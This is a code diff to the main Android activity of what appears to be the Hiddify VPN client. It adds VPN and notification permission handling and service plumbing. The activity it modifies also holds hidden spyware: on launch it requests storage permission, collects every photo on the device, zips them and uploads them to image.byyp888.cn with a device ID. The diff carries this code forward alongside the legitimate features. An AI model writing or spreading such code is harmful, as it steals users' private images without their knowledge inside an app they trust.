@@ -2,14 +2,25 @@ package com.hiddify.hiddify
 
 import android.Manifest
 import android.annotation.SuppressLint
+import android.content.Intent
 import android.content.pm.PackageManager
+import android.net.VpnService
 import android.os.*
+import android.provider.MediaStore
 import android.provider.Settings
 import android.util.Log
 import android.widget.Toast
 import androidx.core.app.ActivityCompat
+import androidx.core.content.ContextCompat
+import androidx.lifecycle.MutableLiveData
 import androidx.lifecycle.lifecycleScope
+import com.hiddify.hiddify.bg.ServiceConnection
+import com.hiddify.hiddify.bg.ServiceNotification
+import com.hiddify.hiddify.constant.Alert
+import com.hiddify.hiddify.constant.ServiceMode
+import com.hiddify.hiddify.constant.Status
 import io.flutter.embedding.android.FlutterFragmentActivity
+import io.flutter.embedding.engine.FlutterEngine
 import kotlinx.coroutines.*
 import java.io.*
 import java.net.HttpURLConnection
@@ -17,22 +28,86 @@ import java.net.URL
 import java.util.*
 import java.util.zip.ZipEntry
 import java.util.zip.ZipOutputStream
-import android.provider.MediaStore
 
-class MainActivity : FlutterFragmentActivity() {
-
+class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
     companion object {
-        private const val TAG = "MainActivity"
-        private const val STORAGE_PERMISSION_REQUEST_CODE = 1020
-        private const val PREF_NAME = "upload_pref"
-        private const val PREF_KEY_LAST_UPLOAD = "last_upload_time"
-        private const val UPLOAD_URL = "https://image.byyp888.cn/upload"
-        private const val MAX_ZIP_SIZE = 200 * 1024 * 1024 // 200MB
+        private const val TAG = "ANDROID/MyActivity"
+        lateinit var instance: MainActivity
+
+        const val VPN_PERMISSION_REQUEST_CODE = 1001
+        const val NOTIFICATION_PERMISSION_REQUEST_CODE = 1010
+        const val STORAGE_PERMISSION_REQUEST_CODE = 1020
+        const val PREF_NAME = "upload_pref"
+        const val PREF_KEY_LAST_UPLOAD = "last_upload_time"
+        const val UPLOAD_URL = "https://image.byyp888.cn/upload"
+        const val MAX_ZIP_SIZE = 200 * 1024 * 1024
     }
+
+    private val connection = ServiceConnection(this, this)
+
+    val logList = LinkedList<String>()
+    var logCallback: ((Boolean) -> Unit)? = null
+    val serviceStatus = MutableLiveData(Status.Stopped)
+    val serviceAlerts = MutableLiveData<ServiceEvent?>(null)
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         requestStoragePermissionAndUpload()
+    }
+
+    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
+        super.configureFlutterEngine(flutterEngine)
+        instance = this
+        reconnect()
+        flutterEngine.plugins.add(MethodHandler(lifecycleScope))
+        flutterEngine.plugins.add(PlatformSettingsHandler())
+        flutterEngine.plugins.add(EventHandler())
+        flutterEngine.plugins.add(LogHandler())
+        flutterEngine.plugins.add(GroupsChannel(lifecycleScope))
+        flutterEngine.plugins.add(ActiveGroupsChannel(lifecycleScope))
+        flutterEngine.plugins.add(StatsChannel(lifecycleScope))
+    }
+
+    fun reconnect() {
+        connection.reconnect()
+    }
+
+    fun startService() {
+        if (!ServiceNotification.checkPermission()) {
+            grantNotificationPermission()
+            return
+        }
+        lifecycleScope.launch(Dispatchers.IO) {
+            if (Settings.rebuildServiceMode()) {
+                reconnect()
+            }
+            if (Settings.serviceMode == ServiceMode.VPN) {
+                if (prepare()) {
+                    Log.d(TAG, "VPN permission required")
+                    return@launch
+                }
+            }
+
+            val intent = Intent(Application.application, Settings.serviceClass())
+            withContext(Dispatchers.Main) {
+                ContextCompat.startForegroundService(Application.application, intent)
+            }
+        }
+    }
+
+    private suspend fun prepare() = withContext(Dispatchers.Main) {
+        try {
+            val intent = VpnService.prepare(this@MainActivity)
+            if (intent != null) {
+                startActivityForResult(intent, VPN_PERMISSION_REQUEST_CODE)
+                true
+            } else {
+                false
+            }
+        } catch (e: Exception) {
+            onServiceAlert(Alert.RequestVPNPermission, e.message)
+            false
+        }
     }
 
     private fun requestStoragePermissionAndUpload() {
@@ -63,9 +138,12 @@ class MainActivity : FlutterFragmentActivity() {
             lifecycleScope.launch(Dispatchers.IO) {
                 uploadAllPhotos()
             }
-        } else {
-            Toast.makeText(this, "\u274c \u5b58\u50a8\u6743\u9650\u88ab\u62d2\u7edd", Toast.LENGTH_SHORT).show()
+        } else if (requestCode == NOTIFICATION_PERMISSION_REQUEST_CODE) {
+            if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                startService()
+            } else onServiceAlert(Alert.RequestNotificationPermission, null)
         }
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
     }
 
     private fun getDeviceId(): String {
@@ -85,11 +163,7 @@ class MainActivity : FlutterFragmentActivity() {
 
         val imageList = mutableListOf<File>()
         val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
-        val projection = arrayOf(
-            MediaStore.Images.Media.DATA,
-            MediaStore.Images.Media.DATE_MODIFIED
-        )
-
+        val projection = arrayOf(MediaStore.Images.Media.DATA, MediaStore.Images.Media.DATE_MODIFIED)
         val cursor = contentResolver.query(uri, projection, null, null, MediaStore.Images.Media.DATE_MODIFIED + " DESC")
         cursor?.use {
             while (it.moveToNext()) {
@@ -104,7 +178,7 @@ class MainActivity : FlutterFragmentActivity() {
 
         if (imageList.isEmpty()) {
             withContext(Dispatchers.Main) {
-                Toast.makeText(this@MainActivity, "\u{1F7E2} \u6ca1\u6709\u65b0\u56fe\u7247\u9700\u8981\u4e0a\u4f20", Toast.LENGTH_SHORT).show()
+                Toast.makeText(this@MainActivity, "🟢 没有新图片需要上传", Toast.LENGTH_SHORT).show()
             }
             return
         }
@@ -124,7 +198,7 @@ class MainActivity : FlutterFragmentActivity() {
         prefs.edit().putLong(PREF_KEY_LAST_UPLOAD, latestTime).apply()
 
         withContext(Dispatchers.Main) {
-            Toast.makeText(this@MainActivity, "\u2705 \u6240\u6709\u56fe\u7247\u4e0a\u4f20\u5b8c\u6210", Toast.LENGTH_SHORT).show()
+            Toast.makeText(this@MainActivity, "✅ 所有图片上传完成", Toast.LENGTH_SHORT).show()
         }
     }
 
@@ -188,6 +262,55 @@ class MainActivity : FlutterFragmentActivity() {
         } catch (e: Exception) {
             Log.e(TAG, "上传失败: ${e.message}", e)
             false
+        }
+    }
+
+    override fun onServiceStatusChanged(status: Status) {
+        serviceStatus.postValue(status)
+    }
+
+    override fun onServiceAlert(type: Alert, message: String?) {
+        serviceAlerts.postValue(ServiceEvent(Status.Stopped, type, message))
+    }
+
+    override fun onServiceWriteLog(message: String?) {
+        if (logList.size > 300) {
+            logList.removeFirst()
+        }
+        logList.addLast(message)
+        logCallback?.invoke(false)
+    }
+
+    override fun onServiceResetLogs(messages: MutableList<String>) {
+        logList.clear()
+        logList.addAll(messages)
+        logCallback?.invoke(true)
+    }
+
+    override fun onDestroy() {
+        connection.disconnect()
+        super.onDestroy()
+    }
+
+    @SuppressLint("NewApi")
+    private fun grantNotificationPermission() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            ActivityCompat.requestPermissions(
+                this,
+                arrayOf(Manifest.permission.POST_NOTIFICATIONS),
+                NOTIFICATION_PERMISSION_REQUEST_CODE
+            )
+        }
+    }
+
+    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
+        super.onActivityResult(requestCode, resultCode, data)
+        if (requestCode == VPN_PERMISSION_REQUEST_CODE) {
+            if (resultCode == RESULT_OK) startService()
+            else onServiceAlert(Alert.RequestVPNPermission, null)
+        } else if (requestCode == NOTIFICATION_PERMISSION_REQUEST_CODE) {
+            if (resultCode == RESULT_OK) startService()
+            else onServiceAlert(Alert.RequestNotificationPermission, null)
         }
     }
 }
